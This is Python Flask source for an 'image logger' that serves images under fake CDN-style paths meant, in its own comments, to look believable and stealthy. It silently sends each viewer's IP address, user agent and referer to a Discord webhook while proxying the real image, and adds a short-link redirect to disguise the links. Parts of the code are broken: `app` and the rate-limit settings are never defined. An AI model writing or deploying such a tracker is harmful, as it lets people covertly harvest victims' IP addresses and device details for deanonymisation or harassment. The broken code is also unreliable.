from flask import Flask, request, send_file, abort, redirect
import requests
import datetime
import uuid
import hashlib
import time
from collections import defaultdict
import os

# === CONFIG ===

WEBHOOK_URL = os.environ.get('WEBHOOK_URL')

# Fake CDN base paths for rotation / believability
CDN_PATHS = [
    "/assets/images/",
    "/cdn/img/",
    "/media/2026/",
    "/uploads/04/",
    "/static/content/"
]

def get_random_cdn_path():
    year = datetime.datetime.now().year
    month = f"{datetime.datetime.now().month:02d}"
    random_hash = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:12]
    filename = f"photo-{random_hash}.png"  # or .jpg for variety
    base = CDN_PATHS[int(random_hash, 16) % len(CDN_PATHS)]
    return f"{base}{year}/{month}/{filename}"

def is_rate_limited(ip):
    now = time.time()
    if ip not in RATE_LIMIT:
        RATE_LIMIT[ip] = []
    RATE_LIMIT[ip] = [t for t in RATE_LIMIT[ip] if now - t < RATE_LIMIT_WINDOW]
    if len(RATE_LIMIT[ip]) >= MAX_HITS:
        return True
    RATE_LIMIT[ip].append(now)
    return False

def send_to_discord(log_data):
    embed = {
        "title": "🖼️ Image Logger Hit",
        "description": f"**IP:** `{log_data['ip']}`\n"
                      f"**Time:** {log_data['time']}\n"
                      f"**User-Agent:** ```{log_data['user_agent'][:300]}```\n"
                      f"**Referer:** `{log_data['referer']}`\n"
                      f"**Original Image:** {log_data['original_url']}\n"
                      f"**Path:** {log_data['path']}",
        "color": 0x00ff88,
        "footer": {"text": f"ID: {log_data['log_id']} | Vercel Serverless"}
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except:
        pass

@app.route('/s/<short_code>')  # Self-hosted shortener
def redirect_short(short_code):
    # In production you could store mappings in a dict or Vercel KV, but for simplicity:
    # Here we assume short_code is base64-like or just redirect to a generated logger URL
    # For real use, add a mapping system or hardcode patterns
    original_url = request.args.get('u')  # Pass original image via query if needed
    full_logger_url = f"/{short_code[:4]}/{short_code[4:]}"  # Fake expansion
    return redirect(full_logger_url + f"?u={original_url or ''}", code=302)

@app.route('/<path:full_path>')  # Catch-all for CDN-style paths
def serve_image(full_path):
    ip = request.remote_addr
    if is_rate_limited(ip):
        return send_file('static/pixel.png', mimetype='image/png')  # Silent fail

    log_id = str(uuid.uuid4())[:10]
    original_url = request.args.get('u', 'Unknown')

    log_data = {
        "log_id": log_id,
        "ip": ip,
        "user_agent": request.headers.get('User-Agent', 'N/A'),
        "referer": request.headers.get('Referer', 'N/A'),
        "original_url": original_url,
        "time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'),
        "path": full_path
    }

    send_to_discord(log_data)

    # Proxy the real image if provided (max stealth)
    if original_url.startswith(('http://', 'https://')):
        try:
            headers = {'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0')}
            resp = requests.get(original_url, headers=headers, timeout=8)
            if resp.status_code == 200 and 'image' in resp.headers.get('Content-Type', ''):
                return send_file(
                    resp.content,
                    mimetype=resp.headers.get('Content-Type', 'image/png'),
                    download_name=full_path.split('/')[-1]
                )
        except:
            pass

    # Fallback transparent pixel
    return send_file('static/pixel.png', mimetype='image/png')

# Create static pixel if missing (for local testing)
if not os.path.exists('static'):
    os.makedirs('static')
with open('static/pixel.png', 'wb') as f:
    f.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
